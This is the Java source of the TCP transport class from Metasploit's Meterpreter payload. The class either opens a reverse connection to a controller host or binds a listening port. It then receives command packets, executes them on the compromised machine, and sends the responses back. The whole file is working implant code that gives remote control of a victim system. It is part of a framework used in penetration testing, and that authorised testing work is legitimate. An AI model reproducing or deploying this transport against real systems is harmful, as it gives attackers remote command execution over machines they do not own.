package com.metasploit.meterpreter;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.io.IOException;

import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.SocketTimeoutException;

import com.metasploit.meterpreter.command.Command;
import com.metasploit.stage.TransportConfig;

public class TcpTransport extends Transport {
    private Socket sock = null;
    private DataInputStream inputStream = null;
    private DataOutputStream outputStream = null;
    private String host;
    private int port;


    // This whole thing exists just so that we can deal with
    // the fact that MSF thinks we've 'died' (and therefore
    // it hangs) when we terminate the socket. We need to wait
    // for MSF to terminate instead.
    private static class SocketDisposer extends Thread {
        private final Socket sock;
        private final DataInputStream in;
        private final DataOutputStream out;

        public SocketDisposer(Socket s, DataInputStream in, DataOutputStream out) {
            this.sock = s;
            this.in = in;
            this.out = out;
        }

        @Override
        public void run() {
            if (this.in != null) {
                try {
                    byte[] buffer = new byte[16];
                    while (true) {
                        this.in.readFully(buffer);
                    }
                }
                catch (IOException ex) {
                    try {
                        this.in.close();
                    }
                    catch (IOException ignored) {
                    }
                }
            }

            if (this.out != null) {
                try {
                    // keep writing until the socket dies, from there
                    // we'll know that the other end has actually closed it.
                    while (true) {
                        this.out.writeByte((byte)0);
                    }
                }
                catch (IOException ex) {
                    try {
                        this.out.flush();
                        this.out.close();
                    }
                    catch (IOException ignored) {
                    }
                }
            }

            if (this.sock != null) {
                try {
                    this.sock.close();
                }
                catch (IOException ignored) {
                }
            }
        }
    }

    public TcpTransport(Meterpreter met, String url, TransportConfig transportConfig) {
        this(met, url);
        setTimeouts(transportConfig);
    }

    public TcpTransport(Meterpreter met, String url) {
        super(met, url);

        int portStart = url.lastIndexOf(":");
        this.port = Integer.parseInt(url.substring(portStart + 1));
        this.host = url.substring(url.lastIndexOf("/") + 1, portStart);
    }

    @Override
    public void bind(DataInputStream in, OutputStream rawOut) {
        this.inputStream = in;
        this.outputStream = new DataOutputStream(rawOut);
    }

    @Override
    public boolean switchUri(String uri) {
        // tcp transports don't support URL switching
        return false;
    }

    @Override
    public void disconnect() {
        SocketDisposer s = new SocketDisposer(this.sock, this.inputStream, this.outputStream);
        this.sock = null;
        this.inputStream = null;
        this.outputStream = null;

        s.start();
    }

    @Override
    protected boolean tryConnect(Meterpreter met) throws IOException {
        if (this.inputStream != null) {
            // we're already connected
            return true;
        }

        if (this.host.equals("")) {
            ServerSocket server = new ServerSocket(this.port);
            this.sock = server.accept();
            server.close();
        } else {
            this.sock = new Socket(this.host, this.port);
        }

        if (this.sock != null) {
            this.sock.setSoTimeout(500);
            this.inputStream = new DataInputStream(this.sock.getInputStream());
            this.outputStream = new DataOutputStream(this.sock.getOutputStream());

            // this point we are effectively stageless, so flush the socket
            this.flushInputStream(met.getIgnoreBlocks());

            return true;
        }

        return false;
    }

    @Override
    public TLVPacket readPacket() throws IOException {
        return this.readAndDecodePacket(this.inputStream);
    }

    @Override
    public void writePacket(TLVPacket packet, int type) throws IOException {
        this.encodePacketAndWrite(packet, type, this.outputStream);
    }

    @Override
    public boolean dispatch(Meterpreter met) {
        long lastPacket = System.currentTimeMillis();
        int result = 0;
        while (!met.hasSessionExpired() &&
            System.currentTimeMillis() < lastPacket + this.commTimeout) {
            try {
                TLVPacket request = this.readPacket();

                if (request == null) {
                    continue;
                }

                // got a packet, update the timestamp
                lastPacket = System.currentTimeMillis();

                TLVPacket response = request.createResponse();
                result = met.getCommandManager().executeCommand(met, request, response);

                // Make sure the UUID is baked into each response.
                response.add(TLVType.TLV_TYPE_UUID, met.getUUID());

                this.writePacket(response, TLVPacket.PACKET_TYPE_RESPONSE);

                if (result == Command.EXIT_DISPATCH) {
                    return true;
                }
            } catch (SocketTimeoutException ex) {
                // socket comms timeout, didn't get a packet,
                // this is ok, so we ignore it
            } catch (SocketException ex) {
                // sometimes we'll have issues where writing a response when we're exiting
                // the dispatch is intended, so we'll check for that here too
                if (result == Command.EXIT_DISPATCH) {
                    return true;
                }
            }
            catch (Exception ex) {
                // any other type of exception isn't good.
                break;
            }
        }

        // if we get here we assume things aren't good, or we have a session timeout/expiration
        return false;
    }

    private void flushInputStream(int blocks) throws IOException {
        // we can assume that the server is trying to send the second
        // stage at this point, so let's just read that in for now.
        for (int i = 0; i < blocks; i++) {
            int blobLen = this.inputStream.readInt();
            byte[] throwAway = new byte[blobLen];
            this.inputStream.readFully(throwAway);
        }
        // and finally discard the block count
        if (blocks > 0) {
            this.inputStream.readInt();
        }
    }
}
